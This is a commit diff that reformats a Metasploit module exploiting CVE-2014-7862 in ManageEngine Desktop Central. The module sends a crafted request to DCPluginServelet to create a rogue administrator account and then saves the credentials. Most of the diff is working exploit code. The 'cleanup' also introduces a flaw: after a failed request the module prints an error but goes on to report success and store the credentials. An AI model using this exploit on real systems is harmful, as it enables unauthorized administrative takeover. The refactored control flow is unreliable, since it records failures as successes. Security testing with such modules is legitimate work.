6bb3171328be6bbb24ef8e4aa1ae2359c68632e4
jvazquez-r7 <juan_vazquez@rapid7.com>
2015-01-04 23:12:42 -0600

    Do minor cleanup

--- modules/auxiliary/admin/http/me_dc9_admin.rb
+++ modules/auxiliary/admin/http/me_dc9_admin.rb
@@ -12,18 +12,18 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'ManageEngine Desktop Central Administrator Account Creation',
-      'Description' => %q{
+      'Name'         => 'ManageEngine Desktop Central Administrator Account Creation',
+      'Description'  => %q{
         This module exploits an administrator account creation vulnerability in Desktop Central
         from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in
         several versions of Desktop Central (including MSP) from v7 onwards.
       },
-      'Author' =>
+      'Author'       =>
         [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
+      'License'      => MSF_LICENSE,
+      'References'   =>
         [
           ['CVE', '2014-7862'],
           ['OSVDB', '116554'],
@@ -49,48 +49,49 @@ class Metasploit3 < Msf::Auxiliary
     password_encoded = Rex::Text.encode_base64([Rex::Text.md5(datastore['PASSWORD'] + salt)].pack('H*'))
 
     res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, "/servlets/DCPluginServelet"),
-      'method' =>'GET',
+      'uri'      => normalize_uri(target_uri.path, "/servlets/DCPluginServelet"),
+      'method'   =>'GET',
       'vars_get' => {
-        'action' => 'addPlugInUser',
-        'role' => 'DCAdmin',
-        'userName' => datastore['USERNAME'],
-        'email' => datastore['EMAIL'],
-        'phNumber' => Rex::Text.rand_text_numeric(6),
-        'password' => password_encoded,
-        'salt' => salt,
+        'action'      => 'addPlugInUser',
+        'role'        => 'DCAdmin',
+        'userName'    => datastore['USERNAME'],
+        'email'       => datastore['EMAIL'],
+        'phNumber'    => Rex::Text.rand_text_numeric(6),
+        'password'    => password_encoded,
+        'salt'        => salt,
         'createdtime' => salt
       }
     })
-    if res && res.code == 200 && res.body.to_s =~ /sucess/
-      # Yes, "sucess" is really mispelt, as is "Servelet" ... !
-      print_good("#{peer} - Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
-      service_data = {
-        address: rhost,
-        port: rport,
-        service_name: (ssl ? 'https' : 'http'),
-        protocol: 'tcp',
-        workspace_id: myworkspace_id
-      }
-      credential_data = {
-        origin_type: :service,
-        module_fullname: self.fullname,
-        private_type: :password,
-        private_data: datastore['PASSWORD'],
-        username: datastore['USERNAME']
-      }
 
-      credential_data.merge!(service_data)
-      credential_core = create_credential(credential_data)
-      login_data = {
-        core: credential_core,
-        access_level: 'Administrator',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      }
-      login_data.merge!(service_data)
-      create_credential_login(login_data)
-    else
+    # Yes, "sucess" is really mispelt, as is "Servelet" ... !
+    unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/
       print_error("#{peer} - Administrator account creation failed")
     end
+
+    print_good("#{peer} - Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: (ssl ? 'https' : 'http'),
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    credential_data = {
+      origin_type: :service,
+      module_fullname: self.fullname,
+      private_type: :password,
+      private_data: datastore['PASSWORD'],
+      username: datastore['USERNAME']
+    }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+    login_data = {
+      core: credential_core,
+      access_level: 'Administrator',
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
   end
 end
